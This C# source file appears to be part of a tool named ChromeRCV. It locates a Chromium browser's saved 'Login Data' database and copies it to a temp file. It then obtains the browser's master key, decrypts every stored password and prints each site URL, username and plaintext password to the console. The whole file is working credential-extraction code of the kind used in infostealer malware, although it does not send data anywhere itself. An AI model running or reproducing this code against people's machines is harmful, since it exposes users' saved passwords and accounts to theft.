using System;
using System.Text;
using System.IO;
using System.Collections.Generic;
using System.Data.SQLite;

namespace ChromeRCV
{
    internal sealed class ChromiumLogin
    {
        private string _hostname;
        private string _username;
        private string _password;

        public string Hostname
        {
            get { return _hostname; }
            set { _hostname = value; }
        }

        public string Username
        {
            get { return _username; }
            set { _username = value; }
        }

        public string Password
        {
            get { return _password; }
            set { _password = value; }
        }

        public ChromiumLogin(string hostname, string username, string password)
        {
            _hostname = hostname;
            _username = username;
            _password = password;
        }

        public ChromiumLogin() { }

        public void Print()
        {
            Console.WriteLine("ORIGIN_URL :  " + _hostname);
            Console.WriteLine("USERNAME   :  " + _username);
            Console.WriteLine("PASSWORD   :  " + _password + "\r\n");
        }
    }

    internal sealed class ChromiumLoginManager
    {
        private string _browser;
        private string _browserPath;
        private string _tempFile;
        private byte[] _masterKey;
        private readonly string _loginPath = "\\User Data\\Default\\Login Data";

        public string Browser
        {
            get
            {
                return _browser;
            }
        }

        public ChromiumLoginManager() { }

        public ChromiumLoginManager Reinitialize(string browserPath)
        {
            _browserPath = browserPath;
            var path = browserPath + _loginPath;
            if (File.Exists(path) == false)
                return null;

            _masterKey = Crypt.GetMasterKey(browserPath + "\\User Data");
            if(_masterKey == null)
                return null;
            
            _browser = Utils.GetBrowserFromPath(browserPath);
            _tempFile = Utils.CreateTempFile(path);
            return this;
        }

        public ChromiumLogin ExtractLoginData(SQLiteDataReader reader)
        {
            string hostname = (string)reader["origin_url"];
            string username = (string)reader["username_value"];
            byte[] password = (byte[])reader["password_value"];

            ChromiumLogin c = new ChromiumLogin();
            c.Hostname = hostname;
            c.Username = username;
            c.Password = Crypt.DecryptData(password, _masterKey);
            return c;
        }

        public List<ChromiumLogin> GetData()
        {
            List<ChromiumLogin> logins = new List<ChromiumLogin>();
            using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + _tempFile + ";Version=3;New=True;Compress=True;")) {
                conn.Open();
                using (SQLiteCommand comm = conn.CreateCommand()) {
                    comm.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                    using (SQLiteDataReader reader = comm.ExecuteReader()) {

                        while (reader.Read()) {
                            logins.Add(ExtractLoginData(reader));
                        }
                    }
                }
                conn.Close();
            }
            try {
                File.Delete(_tempFile);
            }
            catch {
                Console.WriteLine($"Failed to delete {_tempFile.ToUpper()}");
            }
            return logins;
        }
    }
}
